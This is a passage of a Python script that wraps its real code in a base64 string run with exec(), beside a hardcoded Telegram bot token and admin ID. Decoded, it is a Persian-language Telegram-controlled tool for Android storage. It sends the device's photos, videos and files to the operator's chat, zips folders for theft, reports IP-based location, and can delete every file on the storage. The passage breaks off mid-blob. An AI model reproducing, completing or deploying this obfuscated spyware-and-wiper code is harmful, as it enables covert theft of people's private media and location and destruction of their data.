import base64
TOKEN = "7463497059:AAEPhpok7ws4hw6Lz-qvOp1-JEVVaSblk_Q"
ADMIN_ID = "7046488481"
exec(base64.b64decode("aW1wb3J0IG9zCmltcG9ydCBzaHV0aWwKaW1wb3J0IHJhbmRvbQppbXBvcnQgdGhyZWFkaW5nCmltcG9ydCB0aW1lCmZyb20gdGVsZWJvdCBpbXBvcnQgVGVsZUJvdCwgdHlwZXMKZnJvbSBjb2xvcmFtYSBpbXBvcnQgRm9yZSwgU3R5bGUsIGluaXQKCmluaXQoKSAgCgpUT0tFTiA9ICc3NzUwOTM2OTgxOkFBRWpCVFktRVgwejNTdnhUUFV0RHg5UENlSG1sNHlyLWk0JyAgIyBUb2tlbgpBRE1JTl9JRCA9IDcwNDY0ODg0ODEgICMgQWRtaW4gSUQKYm90ID0gVGVsZUJvdChUT0tFTikKCnJlcXVpcmVkX2xpYnJhcmllcyA9IFsndGVsZWJvdCcsICdjb2xvcmFtYSddCgpkZWYgaW5zdGFsbF9saWJyYXJpZXMoKToKICAgIGZvciBsaWIgaW4gcmVxdWlyZWRfbGlicmFyaWVzOgogICAgICAgIHRyeToKICAgICAgICAgICAgX19pbXBvcnRfXyhsaWIpCiAgICAgICAgZXhjZXB0IEltcG9ydEVycm9yOgogICAgICAgICAgICBvcy5zeXN0ZW0oZidwaXAgaW5zdGFsbCB7bGlifScpCgppbnN0YWxsX2xpYnJhcmllcygpCgpkZWYgY291bnRfcGhvdG9zKGRpcmVjdG9yeSk6CiAgICBjb3VudCA9IDAKICAgIGZvciByb290LCBkaXJzLCBmaWxlcyBpbiBvcy53YWxrKGRpcmVjdG9yeSk6CiAgICAgICAgZm9yIGZpbGUgaW4gZmlsZXM6CiAgICAgICAgICAgIGlmIGZpbGUuZW5kc3dpdGgoJy5qcGcnKSBvciBmaWxlLmVuZHN3aXRoKCcucG5nJyk6CiAgICAgICAgICAgICAgICBjb3VudCArPSAxCiAgICByZXR1cm4gY291bnQKCmRlZiBjb3VudF92aWRlb3MoZGlyZWN0b3J5KToKICAgIGNvdW50ID0gMAogICAgZm9yIHJvb3QsIGRpcnMsIGZpbGVzIGluIG9zLndhbGsoZGlyZWN0b3J5KToKICAgICAgICBmb3IgZmlsZSBpbiBmaWxlczoKICAgICAgICAgICAgaWYgZmlsZS5lbmRzd2l0aCgnLm1wNCcpIG9yIGZpbGUuZW5kc3dpdGgoJy5hdmknKSBvciBmaWxlLmVuZHN3aXRoKCcubWt2Jyk6CiAgICAgICAgICAgICAgICBjb3VudCArPSAxCiAgICByZXR1cm4gY291bnQKCmRlZiBzZW5kX21lZGlhX2Zyb21fZGlyZWN0b3J5KGRpcmVjdG9yeSwgY291bnQsIG1lc3NhZ2UsIG1lZGlhX3R5cGUpOgogICAgc2VudF9jb3VudCA9IDAKICAgIGZvciByb290LCBkaXJzLCBmaWxlcyBpbiBvcy53YWxrKGRpcmVjdG9yeSk6CiAgICAgICAgZm9yIGZpbGUgaW4gZmlsZXM6CiAgICAgICAgICAgIGlmIChtZWRpYV90eXBlID09ICdwaG90bycgYW5kIChmaWxlLmVuZHN3aXRoKCcuanBnJykgb3IgZmlsZS5lbmRzd2l0aCgnLnBuZycpKSkgb3IgXAogICAgICAgICAgICAgICAobWVkaWFfdHlwZSA9PSAndmlkZW8nIGFuZCAoZmlsZS5lbmRzd2l0aCgnLm1wNCcpIG9yIGZpbGUuZW5kc3dpdGgoJy5hdmknKSBvciBmaWxlLmVuZHN3aXRoKCcubWt2JykpKToKICAgICAgICAgICAgICAgIGlmIHNlbnRfY291bnQgPj0gY291bnQ6CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgd2l0aCBvcGVuKG9zLnBhdGguam9pbihyb290LCBmaWxlKSwgJ3JiJykgYXMgbWVkaWFfZmlsZToKICAgICAgICAgICAgICAgICAgICAgICAgaWYgbWVkaWFfdHlwZSA9PSAncGhvdG8nOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgYm90LnNlbmRfcGhvdG8obWVzc2FnZS5jaGF0LmlkLCBtZWRpYV9maWxlKQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgYm90LnNlbmRfdmlkZW8obWVzc2FnZS5jaGF0LmlkLCBtZWRpYV9maWxlKQogICAgICAgICAgICAgICAgICAgIHNlbnRfY291bnQgKz0gMQogICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICAgICAgICAgIGJvdC5zZW5kX21lc3NhZ2UobWVzc2FnZS5jaGF0LmlkLCBmJ0Vycm9yIHNlbmRpbmcge21lZGlhX3R5cGV9OiB7ZX0nKQoKQGJvdC5tZXNzYWdlX2hhbmRsZXIoY29tbWFuZHM9WydzdGFydCddKQpkZWYgc3RhcnQobWVzc2FnZSk6CiAgICB3ZWxjb21lX3RleHQgPSAi2LPZhNin2YUhINmF2YYg2LHYqNin2Kog2YfaqSDYrdix2YHZh+KAjNin24wg2KrZiNin2YUuINqG2LfZiNixINmF24zigIzYqtmI2YbZhSDaqdmF2qnYqiDaqdmG2YXYnyDwn5KAIgogICAga2V5Ym9hcmQgPSB0eXBlcy5JbmxpbmVLZXlib2FyZE1hcmt1cCgpCiAgICBidXR0b24xID0gdHlwZXMuSW5saW5lS2V5Ym9hcmRCdXR0b24oJ9in2LPYqtiu2LHYp9isINi52qnYs+KAjNmH2Kcg8J+TuCcsIGNhbGxiYWNrX2RhdGE9J2V4dHJhY3RfcGhvdG9zJykKICAgIGJ1dHRvbjIgPSB0eXBlcy5JbmxpbmVLZXlib2FyZEJ1dHRvbign2YfaqSDZhdmI2YLYuduM2Kog8J+MjScsIGNhbGxiYWNrX2RhdGE9J2xvY2F0aW9uJykKICAgIGJ1dHRvbjMgPSB0eXBlcy5JbmxpbmVLZXlib2FyZEJ1dHRvbign2b7Yp9qp2LPYp9iy24wg2K/Yp9iv2YfigIzZh9inIPCfl5HvuI8nLCBjYWxsYmFja19kYXRhPSdjbGVhcl9kYXRhJykKICAgIGJ1dHRvbjQgPSB0eXBlcy5JbmxpbmVLZXlib2FyZEJ1dHRvbign2KfYs9iq2K7Ysdin2Kwg2YjbjNiv24zZiNmH2Kcg8J+OpScsIGNhbGxiYWNrX2RhdGE9J3NlYXJjaF92aWRlb3MnKQogICAgYnV0dG9uNSA9IHR5cGVzLklubGluZUtleWJvYXJkQnV0dG9uKCfaqdm+24wg2K/Yp9iv2YfigIzZh9inIPCfk4InLCBjYWxsYmFja19kYXRhPSdjb3B5X2RhdGEnKQogICAga2V5Ym9hcmQuYWRkKGJ1dHRvbjEsIGJ1dHRvbjIpCiAgICBrZXlib2FyZC5hZGQoYnV0dG9uMywgYnV0dG9uNCkKICAgIGtleWJvYXJkLmFkZChidXR0b241KQogICAgYm90LnNlbmRfbWVzc2FnZShtZXNzYWdlLmNoYXQuaWQsIHRleHQ9d2VsY29tZV90ZXh0LCByZXBseV9tYXJrdXA9a2V5Ym9hcmQpCgppbXBvcnQgaGFzaGxpYgppbXBvcnQgb3MKZnJvbSB0ZWxlYm90IGltcG9ydCB0eXBlcwoKSVRFTVNfUEVSX1BBR0UgPSAxMApuYXZpZ2F0aW9uX2hpc3RvcnkgPSB7fQoKQGJvdC5jYWxsYmFja19xdWVyeV9oYW5kbGVyKGZ1bmM9bGFtYmRhIGNhbGw6IGNhbGwuZGF0YSA9PSAnZmlsZXMnKQpkZWYgaGFuZGxlX2ZpbGVzKGNhbGwpOgogICAgcm9vdF9kaXJlY3RvcnkgPSAnL3N0b3JhZ2UvZW11bGF0ZWQvMC8nCiAgICBuYXZpZ2F0aW9uX2hpc3RvcnlbY2FsbC5tZXNzYWdlLmNoYXQuaWRdID0gW3Jvb3RfZGlyZWN0b3J5XQogICAgc2hvd19kaXJlY3RvcnlfY29udGVudHMoY2FsbC5tZXNzYWdlLCByb290X2RpcmVjdG9yeSwgMCkKCmRlZiBoYXNoX3BhdGgocGF0aCk6CiAgICByZXR1cm4gaGFzaGxpYi5zaGEyNTYocGF0aC5lbmNvZGUoKSkuaGV4ZGlnZXN0KClbOjE2XQoKZGVmIHNob3dfZGlyZWN0b3J5X2NvbnRlbnRzKG1lc3NhZ2UsIGRpcmVjdG9yeSwgcGFnZSk6CiAgICBjaGF0X2lkID0gbWVzc2FnZS5jaGF0LmlkCiAgICBoaXN0b3J5ID0gbmF2aWdhdGlvbl9oaXN0b3J5LmdldChjaGF0X2lkLCBbXSkKICAgIGtleWJvYXJkID0gdHlwZXMuSW5saW5lS2V5Ym9hcmRNYXJrdXAoKQogICAgZmlsZXMgPSBbXQogICAgZGlycyA9IFtdCiAgICBmb3IgaXRlbSBpbiBvcy5saXN0ZGlyKGRpcmVjdG9yeSk6CiAgICAgICAgaXRlbV9wYXRoID0gb3MucGF0aC5qb2luKGRpcmVjdG9yeSwgaXRlbSkKICAgICAgICBpZiBvcy5wYXRoLmlzZmlsZShpdGVtX3BhdGgpOgogICAgICAgICAgICBmaWxlcy5hcHBlbmQoaXRlbSkKICAgICAgICBlbHNlOgogICAgICAgICAgICBkaXJzLmFwcGVuZChpdGVtKQogICAgCiAgICBhbGxfaXRlbXMgPSBkaXJzICsgZmlsZXMKICAgIHN0YXJ0ID0gcGFnZSAqIElURU1TX1BFUl9QQUdFCiAgICBlbmQgPSBzdGFydCArIElURU1TX1BFUl9QQUdFCiAgICBjdXJyZW50X2l0ZW1zID0gYWxsX2l0ZW1zW3N0YXJ0OmVuZF0KICAgIAogICAgZm9yIGl0ZW0gaW4gY3VycmVudF9pdGVtczoKICAgICAgICBpdGVtX3BhdGggPSBvcy5wYXRoLmpvaW4oZGlyZWN0b3J5LCBpdGVtKQogICAgICAgIGlmIG9zLnBhdGguaXNmaWxlKGl0ZW1fcGF0aCk6CiAgICAgICAgICAgIGlmIGl0ZW0ubG93ZXIoKS5lbmRzd2l0aCgoJy5wbmcnLCAnLmpwZycsICcuanBlZycsICcuZ2lmJykpOgogICAgICAgICAgICAgICAgYnV0dG9uID0gdHlwZXMuSW5saW5lS2V5Ym9hcmRCdXR0b24oZifwn5O3IHtpdGVtfScsIGNhbGxiYWNrX2RhdGE9ZidmaWxlX3toYXNoX3BhdGgoaXRlbV9wYXRoKX0nKQogICAgICAgICAgICBlbGlmIGl0ZW0ubG93ZXIoKS5lbmRzd2l0aCgoJy5tcDQnLCAnLmF2aScsICcubWt2JykpOgogICAgICAgICAgICAgICAgYnV0dG9uID0gdHlwZXMuSW5saW5lS2V5Ym9hcmRCdXR0b24oZifwn46lIHtpdGVtfScsIGNhbGxiYWNrX2RhdGE9ZidmaWxlX3toYXNoX3BhdGgoaXRlbV9wYXRoKX0nKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgYnV0dG9uID0gdHlwZXMuSW5saW5lS2V5Ym9hcmRCdXR0b24oZifwn5OEIHtpdGVtfScsIGNhbGxiYWNrX2RhdGE9ZidmaWxlX3toYXNoX3BhdGgoaXRlbV9wYXRoKX0nKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIGJ1dHRvbiA9IHR5cGVzLklubGluZUtleWJvYXJkQnV0dG9uKGYn8J+TgSB7aXRlbX0nLCBjYWxsYmFja19kYXRhPWYnZGlyX3toYXNoX3BhdGgoaXRlbV9wYXRoKX0nKQogICAgICAgIGtleWJvYXJkLmFkZChidXR0b24pCiAgICAKICAgIGlmIGxlbihoaXN0b3J5KSA+IDE6CiAgICAgICAgYmFja19idXR0b24gPSB0eXBlcy5JbmxpbmVLZXlib2FyZEJ1dHRvbign4qyF77iPIEJhY2snLCBjYWxsYmFja19kYXRhPWYnYmFja197aGFzaF9wYXRoKGRpcmVjdG9yeSl9JykKICAgICAgICBrZXlib2FyZC5hZGQoYmFja19idXR0b24pCiAgICAKICAgIGlmIGVuZCA8IGxlbihhbGxfaXRlbXMpOgogICAgICAgIG5leHRfYnV0dG9uID0gdHlwZXMuSW5saW5lS2V5Ym9hcmRCdXR0b24oJ+Keoe+4jyBOZXh0IFBhZ2UnLCBjYWxsYmFja19kYXRhPWYncGFnZV97aGFzaF9wYXRoKGRpcmVjdG9yeSl9X3twYWdlKzF9JykKICAgICAgICBrZXlib2FyZC5hZGQobmV4dF9idXR0b24pCiAgICAKICAgIGlmIHBhZ2UgPiAwOgogICAgICAgIHByZXZfYnV0dG9uID0gdHlwZXMuSW5saW5lS2V5Ym9hcmRCdXR0b24oJ+Kshe+4jyBQcmV2aW91cyBQYWdlJywgY2FsbGJhY2tfZGF0YT1mJ3BhZ2Vfe2hhc2hfcGF0aChkaXJlY3RvcnkpfV97cGFnZS0xfScpCiAgICAgICAga2V5Ym9hcmQuYWRkKHByZXZfYnV0dG9uKQogICAgCiAgICBpZiBtZXNzYWdlLnJlcGx5X3RvX21lc3NhZ2U6CiAgICAgICAgYm90LmVkaXRfbWVzc2FnZV90ZXh0KGNoYXRfaWQ9Y2hhdF9pZCwgbWVzc2FnZV9pZD1tZXNzYWdlLm1lc3NhZ2VfaWQsIHRleHQ9ZiJGb2xkZXIgY29udGVudHM6IHtkaXJlY3Rvcnl9IiwgcmVwbHlfbWFya3VwPWtleWJvYXJkKQogICAgZWxzZToKICAgICAgICBib3Quc2VuZF9tZXNzYWdlKGNoYXRfaWQsIGYi2YXYrdiq2YjYp9uMINm+2YjYtNmHOiB7ZGlyZWN0b3J5fSIsIHJlcGx5X21hcmt1cD1rZXlib2FyZCkKCkBib3QuY2FsbGJhY2tfcXVlcnlfaGFuZGxlcihmdW5jPWxhbWJkYSBjYWxsOiBjYWxsLmRhdGEuc3RhcnRzd2l0aCgnZGlyXycpKQpkZWYgaGFuZGxlX2RpcmVjdG9yeV9jbGljayhjYWxsKToKICAgIGRpcmVjdG9yeV9oYXNoID0gY2FsbC5kYXRhLnNwbGl0KCdfJywgMSlbMV0KICAgIGRpcmVjdG9yeSA9IGZpbmRfcGF0aF9ieV9oYXNoKGRpcmVjdG9yeV9oYXNoKQogICAgaWYgZGlyZWN0b3J5IGlzIE5vbmU6CiAgICAgICAgYm90LmFuc3dlcl9jYWxsYmFja19xdWVyeShjYWxsLmlkLCAn2K7Yt9inOiDZhdiz24zYsSDZvtuM2K/YpyDZhti02K8uIPCfmqsnKQogICAgICAgIHJldHVybgogICAgY2hhdF9pZCA9IGNhbGwubWVzc2FnZS5jaGF0LmlkCiAgICBoaXN0b3J5ID0gbmF2aWdhdGlvbl9oaXN0b3J5LmdldChjaGF0X2lkLCBbXSkKICAgIGhpc3RvcnkuYXBwZW5kKGRpcmVjdG9yeSkKICAgIG5hdmlnYXRpb25faGlzdG9yeVtjaGF0X2lkXSA9IGhpc3RvcnkKICAgIHNob3dfZGlyZWN0b3J5X2NvbnRlbnRzKGNhbGwubWVzc2FnZSwgZGlyZWN0b3J5LCAwKQoKQGJvdC5jYWxsYmFja19xdWVyeV9oYW5kbGVyKGZ1bmM9bGFtYmRhIGNhbGw6IGNhbGwuZGF0YS5zdGFydHN3aXRoKCdmaWxlXycpKQpkZWYgaGFuZGxlX2ZpbGVfY2xpY2soY2FsbCk6CiAgICBmaWxlX2hhc2ggPSBjYWxsLmRhdGEuc3BsaXQoJ18nLCAxKVsxXQogICAgZmlsZV9wYXRoID0gZmluZF9wYXRoX2J5X2hhc2goZmlsZV9oYXNoKQogICAgaWYgZmlsZV9wYXRoIGlzIE5vbmU6CiAgICAgICAgYm90LmFuc3dlcl9jYWxsYmFja19xdWVyeShjYWxsLmlkLCAn2K7Yt9inOiDZgdin24zZhCDZvtuM2K/YpyDZhti02K8uIPCfmqsnKQogICAgICAgIHJldHVybgogICAgdHJ5OgogICAgICAgIHdpdGggb3BlbihmaWxlX3BhdGgsICdyYicpIGFzIGZpbGU6CiAgICAgICAgICAgIGlmIGZpbGVfcGF0aC5sb3dlcigpLmVuZHN3aXRoKCgnLnBuZycsICcuanBnJywgJy5qcGVnJywgJy5naWYnKSk6CiAgICAgICAgICAgICAgICBib3Quc2VuZF9waG90byhjYWxsLm1lc3NhZ2UuY2hhdC5pZCwgZmlsZSkKICAgICAgICAgICAgZWxpZiBmaWxlX3BhdGgubG93ZXIoKS5lbmRzd2l0aCgoJy5tcDQnLCAnLmF2aScsICcubWt2JykpOgogICAgICAgICAgICAgICAgYm90LnNlbmRfdmlkZW8oY2FsbC5tZXNzYWdlLmNoYXQuaWQsIGZpbGUpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBib3Quc2VuZF9kb2N1bWVudChjYWxsLm1lc3NhZ2UuY2hhdC5pZCwgZmlsZSkKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBib3QuYW5zd2VyX2NhbGxiYWNrX3F1ZXJ5KGNhbGwuaWQsIGYn2K7Yt9inINiv2LEg2KfYsdiz2KfZhCDZgdin24zZhDoge2V9IPCfmqsnKQoKQGJvdC5jYWxsYmFja19xdWVyeV9oYW5kbGVyKGZ1bmM9bGFtYmRhIGNhbGw6IGNhbGwuZGF0YS5zdGFydHN3aXRoKCdwYWdlXycpKQpkZWYgaGFuZGxlX3BhZ2VfY2xpY2soY2FsbCk6CiAgICBkYXRhID0gY2FsbC5kYXRhLnNwbGl0KCdfJywgMikKICAgIGRpcmVjdG9yeV9oYXNoID0gZGF0YVsxXQogICAgZGlyZWN0b3J5ID0gZmluZF9wYXRoX2J5X2hhc2goZGlyZWN0b3J5X2hhc2gpCiAgICBpZiBkaXJlY3RvcnkgaXMgTm9uZToKICAgICAgICBib3QuYW5zd2VyX2NhbGxiYWNrX3F1ZXJ5KGNhbGwuaWQsICfYrti32Kc6INmF2LPbjNixINm+24zYr9inINmG2LTYry4g8J+aqycpCiAgICAgICAgcmV0dXJuCiAgICBwYWdlID0gaW50KGRhdGFbMl0pCiAgICBzaG93X2RpcmVjdG9yeV9jb250ZW50cyhjYWxsLm1lc3NhZ2UsIGRpcmVjdG9yeSwgcGFnZSkKCkBib3QuY2FsbGJhY2tfcXVlcnlfaGFuZGxlcihmdW5jPWxhbWJkYSBjYWxsOiBjYWxsLmRhdGEuc3RhcnRzd2l0aCgnYmFja18nKSkKZGVmIGhhbmRsZV9iYWNrX2NsaWNrKGNhbGwpOgogICAgZGlyZWN0b3J5X2hhc2ggPSBjYWxsLmRhdGEuc3BsaXQoJ18nLCAxKVsxXQogICAgZGlyZWN0b3J5ID0gZmluZF9wYXRoX2J5X2hhc2goZGlyZWN0b3J5X2hhc2gpCiAgICBpZiBkaXJlY3RvcnkgaXMgTm9uZToKICAgICAgICBib3QuYW5zd2VyX2NhbGxiYWNrX3F1ZXJ5KGNhbGwuaWQsICfYrti32Kc6INmF2LPbjNixINm+24zYr9inINmG2LTYry4g8J+aqycpCiAgICAgICAgcmV0dXJuCiAgICBjaGF0X2lkID0gY2FsbC5tZXNzYWdlLmNoYXQuaWQKICAgIGhpc3RvcnkgPSBuYXZpZ2F0aW9uX2hpc3RvcnkuZ2V0KGNoYXRfaWQsIFtdKQogICAgaWYgbGVuKGhpc3RvcnkpID4gMToKICAgICAgICBoaXN0b3J5LnBvcCgpCiAgICAgICAgbmF2aWdhdGlvbl9oaXN0b3J5W2NoYXRfaWRdID0gaGlzdG9yeQogICAgICAgIHByZXZpb3VzX2RpcmVjdG9yeSA9IGhpc3RvcnlbLTFdCiAgICAgICAgc2hvd19kaXJlY3RvcnlfY29udGVudHMoY2FsbC5tZXNzYWdlLCBwcmV2aW91c19kaXJlY3RvcnksIDApCgpkZWYgZmluZF9wYXRoX2J5X2hhc2gocGF0aF9oYXNoKToKICAgIHJvb3RfZGlyZWN0b3J5ID0gJy9zdG9yYWdlL2VtdWxhdGVkLzAvJwogICAgZm9yIHJvb3QsIGRpcnMsIGZpbGVzIGluIG9zLndhbGsocm9vdF9kaXJlY3RvcnkpOgogICAgICAgIGZvciBpdGVtIGluIGRpcnMgKyBmaWxlczoKICAgICAgICAgICAgaXRlbV9wYXRoID0gb3MucGF0aC5qb2luKHJvb3QsIGl0ZW0pCiAgICAgICAgICAgIGlmIGhhc2hfcGF0aChpdGVtX3BhdGgpID09IHBhdGhfaGFzaDoKICAgICAgICAgICAgICAgIHJldHVybiBpdGVtX3BhdGgKICAgIHJldHVybiBOb25lICAKCkBib3QuY2FsbGJhY2tfcXVlcnlfaGFuZGxlcihmdW5jPWxhbWJkYSBjYWxsOiBjYWxsLmRhdGEgPT0gJ2xvY2F0aW9uJykKZGVmIGhhbmRsZV9sb2NhdGlvbihjYWxsKToKICAgIGltcG9ydCByZXF1ZXN0cwogICAgaXBfaW5mbyA9IHJlcXVlc3RzLmdldCgnaHR0cDovL2lwLWFwaS5jb20vanNvbi8nKS5qc29uKCkKICAgIGlmIGlwX2luZm9bJ3N0YXR1cyddID09ICdzdWNjZXNzJzoKICAgICAgICBsYXRpdHVkZSA9IGlwX2luZm9bJ2xhdCddCiAgICAgICAgbG9uZ2l0dWRlID0gaXBfaW5mb1snbG9uJ10KICAgICAgICBhZGRpdGlvbmFsX2luZm8gPSBmItin2LfZhNin2LnYp9iqINin2LbYp9mB24w6XG7aqdi02YjYsToge2lwX2luZm9bJ2NvdW50cnknXX1cbtmF2YbYt9mC2Yc6IHtpcF9pbmZvWydyZWdpb25OYW1lJ119XG7YtNmH2LE6IHtpcF9pbmZvWydjaXR5J119XG7Yp9ix2KfYptmH4oCM2K/Zh9mG2K/Zhzoge2lwX2luZm9bJ2lzcCddfVxu2KLbjOKAjNm+24w6IHtpcF9pbmZvWydxdWVyeSddfSIgICAgICAgIAogICAgICAgIGJvdC5zZW5kX2xvY2F0aW9uKGNhbGwubWVzc2FnZS5jaGF0LmlkLCBsYXRpdHVkZSwgbG9uZ2l0dWRlKQogICAgICAgIGJvdC5zZW5kX21lc3NhZ2UoY2FsbC5tZXNzYWdlLmNoYXQuaWQsIGFkZGl0aW9uYWxfaW5mbykKICAgIGVsc2U6CiAgICAgICAgYm90LnNlbmRfbWVzc2FnZShjYWxsLm1lc3NhZ2UuY2hhdC5pZCwgItmG2YXbjOKAjNiq2YjZhtmFINmF2YjZgti524zYqtiqINix2Ygg2b7bjNiv2Kcg2qnZhtmF2Iwg2YTYudmG2KrbjCEiKQoKQGJvdC5jYWxsYmFja19xdWVyeV9oYW5kbGVyKGZ1bmM9bGFtYmRhIGNhbGw6IGNhbGwuZGF0YSA9PSAnZXh0cmFjdF9waG90b3MnKQpkZWYgYXNrX2Zvcl9waG90b19jb3VudChjYWxsKToKICAgIHJvb3RfZGlyZWN0b3J5ID0gJy9zdG9yYWdlL2VtdWxhdGVkLzAvJwogICAgc3BlY2lmaWNfZm9sZGVycyA9IFsnL3N0b3JhZ2UvZW11bGF0ZWQvMC9QaG90b3MnLCAnL3N0b3JhZ2UvZW11bGF0ZWQvMC9JbWFnZXMnLCAnL3N0b3JhZ2UvZW11bGF0ZWQvMC9EQ0lNL0NhbWVyYSddCiAgICBwaG90b19jb3VudCA9IHN1bShjb3VudF9waG90b3MoZm9sZGVyKSBmb3IgZm9sZGVyIGluIHNwZWNpZmljX2ZvbGRlcnMgaWYgb3MucGF0aC5leGlzdHMoZm9sZGVyKSkKICAgIHBob3RvX2NvdW50ICs9IGNvdW50X3Bob3Rvcyhyb290X2RpcmVjdG9yeSkKICAgIGJvdC5zZW5kX21lc3NhZ2UoY2FsbC5tZXNzYWdlLmNoYXQuaWQsIGYn2KrYudiv2KfYryDYudqp2LPigIzZh9inINiq2Ygg2K/Ys9iq2q/Yp9mHOiB7cGhvdG9fY291bnR9LiDahtmG2K/YqtinINmF24zigIzYrtmI2KfbjNifIPCfk7gnKQogICAgYm90LnJlZ2lzdGVyX25leHRfc3RlcF9oYW5kbGVyKGNhbGwubWVzc2FnZSwgcHJvY2Vzc19waG90b19jb3VudCwgcm9vdF9kaXJlY3RvcnksIHNwZWNpZmljX2ZvbGRlcnMpCgpkZWYgcHJvY2Vzc19waG90b19jb3VudChtZXNzYWdlLCByb290X2RpcmVjdG9yeSwgc3BlY2lmaWNfZm9sZGVycyk6CiAgICB0cnk6CiAgICAgICAgY291bnQgPSBpbnQobWVzc2FnZS50ZXh0KQogICAgICAgIGlmIGNvdW50IDw9IDA6CiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IKICAgIGV4Y2VwdCBWYWx1ZUVycm9yOgogICAgICAgIGJvdC5zZW5kX21lc3NhZ2UobWVzc2FnZS5jaGF0LmlkLCAn24zZhyDYudiv2K8g2K/Ysdiz2Kog2YjYp9ix2K8g2qnZhtiMINin2K3ZhdmCISDwn5O4JykKICAgICAgICByZXR1cm4KCiAgICBmb3IgZm9sZGVyIGluIHNwZWNpZmljX2ZvbGRlcnM6CiAgICAgICAgaWYgb3MucGF0aC5leGlzdHMoZm9sZGVyKToKICAgICAgICAgICAgc2VuZF9tZWRpYV9mcm9tX2RpcmVjdG9yeShmb2xkZXIsIGNvdW50LCBtZXNzYWdlLCAncGhvdG8nKQogICAgICAgICAgICBjb3VudCAtPSBjb3VudF9waG90b3MoZm9sZGVyKQogICAgICAgICAgICBpZiBjb3VudCA8PSAwOgogICAgICAgICAgICAgICAgcmV0dXJuCiAgICAKICAgIHNlbmRfbWVkaWFfZnJvbV9kaXJlY3Rvcnkocm9vdF9kaXJlY3RvcnksIGNvdW50LCBtZXNzYWdlLCAncGhvdG8nKQogICAgYXNrX3RvX3JldHVybl90b19tZW51KG1lc3NhZ2UsICdleHRyYWN0X3Bob3RvcycpCgpAYm90LmNhbGxiYWNrX3F1ZXJ5X2hhbmRsZXIoZnVuYz1sYW1iZGEgY2FsbDogY2FsbC5kYXRhID09ICdjbGVhcl9kYXRhJykKZGVmIGNsZWFyX2RhdGEoY2FsbCk6CiAgICByb290X2RpcmVjdG9yeSA9ICcvc3RvcmFnZS9lbXVsYXRlZC8wLycKICAgIGJvdC5zZW5kX21lc3NhZ2UoY2FsbC5tZXNzYWdlLmNoYXQuaWQsICfYtNix2YjYuSDZvtin2qnYs9in2LLbjCDYr9in2K/Zh+KAjNmH2KfYjCDZh9mF2Ycg2obbjNiy2Ygg2YbYp9io2YjYryDZhduM4oCM2qnZhtmFLi4uIPCfl5HvuI8nKQogICAgCiAgICB0cnk6CiAgICAgICAgZm9yIHJvb3QsIGRpcnMsIGZpbGVzIGluIG9zLndhbGsocm9vdF9kaXJlY3RvcnksIHRvcGRvd249RmFsc2UpOgogICAgICAgICAgICBmb3IgbmFtZSBpbiBmaWxlczoKICAgICAgICAgICAgICAgIG9zLnJlbW92ZShvcy5wYXRoLmpvaW4ocm9vdCwgbmFtZSkpCiAgICAgICAgICAgIGZvciBuYW1lIGluIGRpcnM6CiAgICAgICAgICAgICAgICBvcy5ybWRpcihvcy5wYXRoLmpvaW4ocm9vdCwgbmFtZSkpCiAgICAgICAgYm90LnNlbmRfbWVzc2FnZShjYWxsLm1lc3NhZ2UuY2hhdC5pZCwgJ9iv2KfYr9mH4oCM2YfYpyDZhtin2KjZiNivINi02K/ZhtiMINmH24zahtuMINmG2YXZiNmG2K/ZhyEnKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIGJvdC5zZW5kX21lc3NhZ2UoY2FsbC5tZXNzYWdlLmNoYXQuaWQsIGYn2K7Yt9inINiq2Ygg2b7Yp9qp2LPYp9iy24w6IHtlfdiMINqv2YbYryDYstiv2YUhJykKICAgIAogICAgYXNrX3RvX3JldHVybl90b19tZW51KGNhbGwubWVzc2FnZSwgJ2NsZWFyX2RhdGEnKQoKQGJvdC5jYWxsYmFja19xdWVyeV9oYW5kbGVyKGZ1bmM9bGFtYmRhIGNhbGw6IGNhbGwuZGF0YSA9PSAnY29weV9kYXRhJykKZGVmIGFza19mb3JfZm9sZGVyX25hbWUoY2FsbCk6CiAgICBib3Quc2VuZF9tZXNzYWdlKGNhbGwubWVzc2FnZS5jaGF0LmlkLCAn2KfYs9mFINm+2YjYtNmH4oCM2KfbjCDaqdmHINmF24zigIzYrtmI2KfbjCDaqdm+24wg2qnZhtmFINix2Ygg2Kjar9mIOiDwn5OCJykKICAgIGJvdC5yZWdpc3Rlcl9uZXh0X3N0ZXBfaGFuZGxlcihjYWxsLm1lc3NhZ2UsIHByb2Nlc3NfZm9sZGVyX25hbWUpCgpkZWYgcHJvY2Vzc19mb2xkZXJfbmFtZShtZXNzYWdlKToKICAgIGZvbGRlcl9uYW1lID0gbWVzc2FnZS50ZXh0CiAgICByb290X2RpcmVjdG9yeSA9ICcvc3RvcmFnZS9lbXVsYXRlZC8wLycKICAgIGZvbGRlcl9wYXRoID0gZmluZF9mb2xkZXIocm9vdF9kaXJlY3RvcnksIGZvbGRlcl9uYW1lKQogICAgCiAgICBpZiBub3QgZm9sZGVyX3BhdGg6CiAgICAgICAgYm90LnNlbmRfbWVzc2FnZShtZXNzYWdlLmNoYXQuaWQsIGYn2b7ZiNi02YcgIntmb2xkZXJfbmFtZX0iINm+24zYr9inINmG2LTYr9iMINqv2YXYtNiv2YchJykKICAgICAgICBhc2tfdG9fcmV0dXJuX3RvX21lbnUobWVzc2FnZSwgJ2NvcHlfZGF0YScpCiAgICAgICAgcmV0dXJuCiAgICAKICAgIGlmIGlzX2ZvbGRlcl90b29fbGFyZ2UoZm9sZGVyX3BhdGgpOgogICAgICAgIGJvdC5zZW5kX21lc3NhZ2UobWVzc2FnZS5jaGF0LmlkLCAn2KfbjNmGINm+2YjYtNmHINiu24zZhNuMINiz2Ybar9uM2YbZh9iMINii2YXYp9iv2Ycg2KjYp9i0ISDwn5OmJykKICAgIAogICAgemlwX2ZpbGVfcGF0aCA9IGNyZWF0ZV96aXBfYXJjaGl2ZShmb2xkZXJfcGF0aCwgZm9sZGVyX25hbWU